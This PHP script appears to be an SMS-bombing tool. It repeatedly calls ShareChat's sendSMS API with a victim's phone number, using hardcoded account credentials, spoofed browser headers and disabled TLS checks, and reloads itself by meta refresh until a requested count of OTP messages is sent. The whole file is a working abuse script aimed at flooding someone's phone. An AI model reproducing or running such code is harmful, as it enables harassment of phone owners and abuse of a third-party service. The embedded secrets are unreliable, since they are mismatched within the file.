
<?php 
$count=$_REQUEST['count'];
$sent=$_REQUEST['sent'];
$mobno=$_REQUEST['mobno'];
if($sent==$count){	
	header("location:index.php?msg=total ".$count." otp send successuffly");
}
else{ 
	
 $data='{"bn":"broker3","userId":420540824,"passCode":"c4926a1daac51f74157k","client":"web","message":{"sendSMS":1,"language":"Hindi","appNumber":140,"phone":"'.$mobno.'","countryAreaCode":"91"}}';
 $url="https://apis.sharechat.com/user/v1.0.0/sendSMS";
         //header here
        $headers   = array();
        $headers[] = "Host:apis.sharechat.com";
        $headers[] = "content-length:187";
        $headers[] = "accept-language:en";
        $headers[] = "accept:application/json";
        $headers[] = "x-sharechat-userid:420540824";
        $headers[] = "x-sharechat-authorized-userid:420540824";
        $headers[] = "x-sharechat-secret:c4926a1daac51f74157c";
        $headers[] = "user-agent:Mozilla/5.0 (Linux; Android 9; Mi A3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36";
        $headers[] = "content-type:application/json";
        $headers[] = "origin:https://sharechat.com";
        
        $headers[] = "Sec-Fetch-Site:same-site";
        $headers[] = "Sec-Fetch-Mode:cors";
        $headers[] = "Sec-Fetch-Dest:empty";
        $headers[] = "referer:https://sharechat.com/signin?redirect_uri=%2Fprofile";
        $headers[] = "Accept-Encoding:gzip, deflate, br";
        

        //end headers and function start
         $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST,0);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER,0);
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION,0);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        
        $result = curl_exec($ch);
        curl_close($ch);
    


	$sentinc=$sent+1;
   $rl="23.php?sent=".$sentinc."&&count=".$count."&&mobno=".$mobno;
   ?><center><div style="height: 50px;width: 40rem;border-radius:20px;background:#00F306;color: black;font-size: 32px;border:2px dotted red;padding-top: 8px;font-family: Yu Gothic;"> <?php echo $sent; ?> OTP SEND AND CONTINUE....</div></center><?php
	echo '<META HTTP-EQUIV=REFRESH CONTENT="2; '.$rl.'">';
	//header("location:2.php?sent=".$sentinc."&&count=".$count."&&mobno=".$mobno);
}
?>